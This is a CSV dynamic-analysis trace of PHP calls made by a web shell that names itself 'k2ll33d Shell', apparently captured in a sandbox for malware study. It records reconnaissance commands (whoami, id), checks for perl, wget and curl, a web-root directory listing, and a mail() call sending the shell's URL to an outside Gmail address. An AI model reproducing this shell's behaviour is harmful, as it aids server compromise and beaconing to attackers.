uuid,file_md5,index,source,target,argc,argv,return,dynamic
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,10,__main__,php_uname,0,{"value": []},{"value": "Linux aa9210106438 3.10.0-957.21.3.el7.x86_64 #1 SMP Tue Jun 18 16:35:19 UTC 2019 x86_64"},[]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,11,__main__,substr,3,"{""value"": [[0, ""str"", ""Linux aa9210106438 3.10.0-957.21.3.el7.x86_64 #1 SMP Tue Jun 18 16:35:19 UTC 2019 x86_64""], [1, ""start"", 0], [2, ""length"", 3]]}",{"value": "Lin"},"[0, 0, 0]"
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,12,__main__,strtolower,1,"{""value"": [[0, ""str"", ""Lin""]]}",{"value": "lin"},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,13,__main__,exe,1,"{""value"": [[0, ""cmd"", ""whoami""]]}",{"value": "www-data\n"},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,14,exe,function_exists,1,"{""value"": [[0, ""function_name"", ""system""]]}",{"value": true},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,15,exe,ob_start,0,{"value": []},{"value": "void"},[]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,16,exe,system,1,"{""value"": [[0, ""command"", ""whoami""]]}",{"value": "void"},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,17,exe,ob_get_contents,0,{"value": []},{"value": "www-data\n"},[]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,18,exe,ob_get_contents,0,{"value": []},{"value": "www-data\n"},[]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,19,exe,ob_end_clean,0,{"value": []},{"value": "void"},[]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,20,__main__,rapih,1,"{""value"": [[0, ""text"", ""www-data\n""]]}",{"value": "www-data"},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,21,rapih,str_replace,3,"{""value"": [[0, ""search"", ""<br>""], [1, ""replace"", """"], [2, ""subject"", ""www-data\n""]]}",{"value": "www-data\n"},"[0, 0, 0]"
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,22,rapih,trim,1,"{""value"": [[0, ""str"", ""www-data\n""]]}",{"value": "www-data"},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,23,__main__,exe,1,"{""value"": [[0, ""cmd"", ""id""]]}",{"value": "uid=1000(www-data) gid=1000(www-data) groups=1000(www-data)\n"},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,24,exe,function_exists,1,"{""value"": [[0, ""function_name"", ""system""]]}",{"value": true},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,25,exe,ob_start,0,{"value": []},{"value": "void"},[]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,26,exe,system,1,"{""value"": [[0, ""command"", ""id""]]}",{"value": "void"},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,27,exe,ob_get_contents,0,{"value": []},{"value": "uid=1000(www-data) gid=1000(www-data) groups=1000(www-data)\n"},[]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,28,exe,ob_get_contents,0,{"value": []},{"value": "uid=1000(www-data) gid=1000(www-data) groups=1000(www-data)\n"},[]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,29,exe,ob_end_clean,0,{"value": []},{"value": "void"},[]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,30,__main__,rapih,1,"{""value"": [[0, ""text"", ""uid=1000(www-data) gid=1000(www-data) groups=1000(www-data)\n""]]}",{"value": "uid=1000(www-data) gid=1000(www-data) groups=1000(www-data)"},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,31,rapih,str_replace,3,"{""value"": [[0, ""search"", ""<br>""], [1, ""replace"", """"], [2, ""subject"", ""uid=1000(www-data) gid=1000(www-data) groups=1000(www-data)\n""]]}",{"value": "uid=1000(www-data) gid=1000(www-data) groups=1000(www-data)\n"},"[0, 0, 0]"
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,32,rapih,trim,1,"{""value"": [[0, ""str"", ""uid=1000(www-data) gid=1000(www-data) groups=1000(www-data)\n""]]}",{"value": "uid=1000(www-data) gid=1000(www-data) groups=1000(www-data)"},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,33,__main__,getcwd,0,{"value": []},{"value": "/usr/share/nginx/html"},[]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,34,__main__,function_exists,1,"{""value"": [[0, ""function_name"", ""posix_getpwuid""]]}",{"value": true},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,35,__main__,function_exists,1,"{""value"": [[0, ""function_name"", ""posix_getgrgid""]]}",{"value": true},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,36,__main__,zend_fetch_r_server,1,"{""value"": [[0, ""op1"", ""_SERVER""]]}",{"value": []},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,37,__main__,gethostbyname,1,"{""value"": [[0, ""hostname"", ""127.0.0.1:5001""]]}",{"value": "127.0.0.1:5001"},[135]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,38,__main__,zend_fetch_r_server,1,"{""value"": [[0, ""op1"", ""_SERVER""]]}",{"value": []},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,39,__main__,explode,2,"{""value"": [[0, ""separator"", ""/""], [1, ""str"", ""/usr/share/nginx/html/""]]}",{"value": []},"[0, 0]"
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,40,__main__,sizeof,1,"{""value"": [[0, ""var"", []]]}",{"value": 6},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,41,__main__,sizeof,1,"{""value"": [[0, ""var"", []]]}",{"value": 6},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,42,__main__,sizeof,1,"{""value"": [[0, ""var"", []]]}",{"value": 6},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,43,__main__,sizeof,1,"{""value"": [[0, ""var"", []]]}",{"value": 6},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,44,__main__,sizeof,1,"{""value"": [[0, ""var"", []]]}",{"value": 6},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,45,__main__,sizeof,1,"{""value"": [[0, ""var"", []]]}",{"value": 6},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,46,__main__,implode,1,"{""value"": [[0, ""glue"", []]]}",{"value": "fallagtnx@gmail.com"},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,47,__main__,testmysql,0,{"value": []},{"value": "<b><font style='color:#ff0000'>OFF</font></b>"},[]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,48,testmysql,function_exists,1,"{""value"": [[0, ""function_name"", ""mysql_connect""]]}",{"value": false},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,49,testmysql,showstat,1,"{""value"": [[0, ""stat"", ""off""]]}",{"value": "<b><font style='color:#ff0000'>OFF</font></b>"},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,50,__main__,testperl,0,{"value": []},{"value": "<b><font style='color:#00FF00'>ON</font></b>"},[]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,51,testperl,exe,1,"{""value"": [[0, ""cmd"", ""perl -h""]]}","{""value"": ""\nUsage: perl [switches] [--] [programfile] [arguments]\n  -0[octal]         specify record separator (\\0, if no argument)\n  -a     ""}",[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,52,exe,function_exists,1,"{""value"": [[0, ""function_name"", ""system""]]}",{"value": true},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,53,exe,ob_start,0,{"value": []},{"value": "void"},[]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,54,exe,system,1,"{""value"": [[0, ""command"", ""perl -h""]]}",{"value": "void"},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,55,exe,ob_get_contents,0,{"value": []},"{""value"": ""\nUsage: perl [switches] [--] [programfile] [arguments]\n  -0[octal]         specify record separator (\\0, if no argument)\n  -a     ""}",[]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,56,exe,ob_get_contents,0,{"value": []},"{""value"": ""\nUsage: perl [switches] [--] [programfile] [arguments]\n  -0[octal]         specify record separator (\\0, if no argument)\n  -a     ""}",[]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,57,exe,ob_end_clean,0,{"value": []},{"value": "void"},[]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,58,testperl,showstat,1,"{""value"": [[0, ""stat"", ""on""]]}",{"value": "<b><font style='color:#00FF00'>ON</font></b>"},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,59,__main__,testcurl,0,{"value": []},{"value": "<b><font style='color:#ff0000'>OFF</font></b>"},[]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,60,testcurl,function_exists,1,"{""value"": [[0, ""function_name"", ""curl_version""]]}",{"value": false},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,61,testcurl,showstat,1,"{""value"": [[0, ""stat"", ""off""]]}",{"value": "<b><font style='color:#ff0000'>OFF</font></b>"},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,62,__main__,testwget,0,{"value": []},{"value": "<b><font style='color:#00FF00'>ON</font></b>"},[]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,63,testwget,exe,1,"{""value"": [[0, ""cmd"", ""wget --help""]]}","{""value"": ""GNU Wget 1.14, a non-interactive network retriever.\nUsage: wget [OPTION]... [URL]...\n\nMandatory arguments to long options are mand""}",[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,64,exe,function_exists,1,"{""value"": [[0, ""function_name"", ""system""]]}",{"value": true},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,65,exe,ob_start,0,{"value": []},{"value": "void"},[]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,66,exe,system,1,"{""value"": [[0, ""command"", ""wget --help""]]}",{"value": "void"},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,67,exe,ob_get_contents,0,{"value": []},"{""value"": ""GNU Wget 1.14, a non-interactive network retriever.\nUsage: wget [OPTION]... [URL]...\n\nMandatory arguments to long options are mand""}",[]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,68,exe,ob_get_contents,0,{"value": []},"{""value"": ""GNU Wget 1.14, a non-interactive network retriever.\nUsage: wget [OPTION]... [URL]...\n\nMandatory arguments to long options are mand""}",[]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,69,exe,ob_end_clean,0,{"value": []},{"value": "void"},[]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,70,testwget,showstat,1,"{""value"": [[0, ""stat"", ""on""]]}",{"value": "<b><font style='color:#00FF00'>ON</font></b>"},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,71,__main__,zend_fetch_r_server,1,"{""value"": [[0, ""op1"", ""_SERVER""]]}",{"value": []},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,72,__main__,zend_fetch_r_server,1,"{""value"": [[0, ""op1"", ""_SERVER""]]}",{"value": []},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,73,__main__,mail,3,"{""value"": [[0, ""to"", ""fallagtnx@gmail.com""], [1, ""subject"", ""\\x63\\x61\\x64\\x65\\x061\\x075""], [2, ""message"", ""127.0.0.1:5001/754ce09c58618e3605535f20dece15ea_8cf5255d-c30d-425d-926d-f187239e05a8.php""]]}",{"value": "void"},"[0, 0, 135]"
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,74,__main__,base64_decode,1,"{""value"": [[0, ""str"", ""PGgyIGNsYXNzPSJ0aXRsZSI+azJsbDMzZCBTaGVsbDwvaDI+ICA=""]]}",{"value": "<h2 class=\"title\">k2ll33d Shell</h2>  "},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,75,__main__,strtoupper,1,"{""value"": [[0, ""str"", ""<h2 class=\""title\"">k2ll33d Shell</h2>  ""]]}",{"value": "<H2 CLASS=\"TITLE\">K2LL33D SHELL</H2>  "},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,76,__main__,showdir,2,"{""value"": [[0, ""pwd"", ""/usr/share/nginx/html/""], [1, ""prompt"", ""www-data $ ""]]}",{"value": " <form action='?y=/usr/share/nginx/html/&amp;x=shell' method='post' style='margin:8px 0 0 0;'><table class='cmdbox' style='width:5"},"[0, 0]"
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,77,showdir,function_exists,1,"{""value"": [[0, ""function_name"", ""posix_getpwuid""]]}",{"value": true},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,78,showdir,function_exists,1,"{""value"": [[0, ""function_name"", ""posix_getgrgid""]]}",{"value": true},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,79,showdir,opendir,1,"{""value"": [[0, ""path"", ""/usr/share/nginx/html/""]]}",{"value": null},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,80,showdir,readdir,1,"{""value"": [[0, ""dir_handle"", null]]}",{"value": "nginx-logo.png"},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,81,showdir,is_dir,1,"{""value"": [[0, ""filename"", ""nginx-logo.png""]]}",{"value": false},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,82,showdir,is_file,1,"{""value"": [[0, ""filename"", ""nginx-logo.png""]]}",{"value": true},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,83,showdir,readdir,1,"{""value"": [[0, ""dir_handle"", null]]}",{"value": "poweredby.png"},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,84,showdir,is_dir,1,"{""value"": [[0, ""filename"", ""poweredby.png""]]}",{"value": false},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,85,showdir,is_file,1,"{""value"": [[0, ""filename"", ""poweredby.png""]]}",{"value": true},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,86,showdir,readdir,1,"{""value"": [[0, ""dir_handle"", null]]}",{"value": ".."},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,87,showdir,is_dir,1,"{""value"": [[0, ""filename"", ""..""]]}",{"value": true},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,88,showdir,readdir,1,"{""value"": [[0, ""dir_handle"", null]]}",{"value": "."},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,89,showdir,is_dir,1,"{""value"": [[0, ""filename"", "".""]]}",{"value": true},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,90,showdir,readdir,1,"{""value"": [[0, ""dir_handle"", null]]}",{"value": "en-US"},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,91,showdir,is_dir,1,"{""value"": [[0, ""filename"", ""en-US""]]}",{"value": false},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,92,showdir,is_file,1,"{""value"": [[0, ""filename"", ""en-US""]]}",{"value": false},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,93,showdir,readdir,1,"{""value"": [[0, ""dir_handle"", null]]}",{"value": "icons"},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,94,showdir,is_dir,1,"{""value"": [[0, ""filename"", ""icons""]]}",{"value": true},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,95,showdir,readdir,1,"{""value"": [[0, ""dir_handle"", null]]}",{"value": "404.html"},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,96,showdir,is_dir,1,"{""value"": [[0, ""filename"", ""404.html""]]}",{"value": false},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,97,showdir,is_file,1,"{""value"": [[0, ""filename"", ""404.html""]]}",{"value": true},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,98,showdir,readdir,1,"{""value"": [[0, ""dir_handle"", null]]}",{"value": "img"},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,99,showdir,is_dir,1,"{""value"": [[0, ""filename"", ""img""]]}",{"value": false},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,100,showdir,is_file,1,"{""value"": [[0, ""filename"", ""img""]]}",{"value": false},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,101,showdir,readdir,1,"{""value"": [[0, ""dir_handle"", null]]}",{"value": "index.html"},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,102,showdir,is_dir,1,"{""value"": [[0, ""filename"", ""index.html""]]}",{"value": false},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,103,showdir,is_file,1,"{""value"": [[0, ""filename"", ""index.html""]]}",{"value": false},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,104,showdir,readdir,1,"{""value"": [[0, ""dir_handle"", null]]}",{"value": "50x.html"},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,105,showdir,is_dir,1,"{""value"": [[0, ""filename"", ""50x.html""]]}",{"value": false},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,106,showdir,is_file,1,"{""value"": [[0, ""filename"", ""50x.html""]]}",{"value": true},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,107,showdir,readdir,1,"{""value"": [[0, ""dir_handle"", null]]}",{"value": "e7e0d73386aac0f3148d21cd397c5604_a20b6533-b490-4260-90c1-175f786f7938.php"},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,108,showdir,is_dir,1,"{""value"": [[0, ""filename"", ""e7e0d73386aac0f3148d21cd397c5604_a20b6533-b490-4260-90c1-175f786f7938.php""]]}",{"value": false},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,109,showdir,is_file,1,"{""value"": [[0, ""filename"", ""e7e0d73386aac0f3148d21cd397c5604_a20b6533-b490-4260-90c1-175f786f7938.php""]]}",{"value": true},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,110,showdir,readdir,1,"{""value"": [[0, ""dir_handle"", null]]}",{"value": "9ba090b2017fe465b59e62d8e2a5aa97_17aa9c68-ad5f-4c9f-a33f-41436460e481.php"},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,111,showdir,is_dir,1,"{""value"": [[0, ""filename"", ""9ba090b2017fe465b59e62d8e2a5aa97_17aa9c68-ad5f-4c9f-a33f-41436460e481.php""]]}",{"value": false},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,112,showdir,is_file,1,"{""value"": [[0, ""filename"", ""9ba090b2017fe465b59e62d8e2a5aa97_17aa9c68-ad5f-4c9f-a33f-41436460e481.php""]]}",{"value": true},[0]
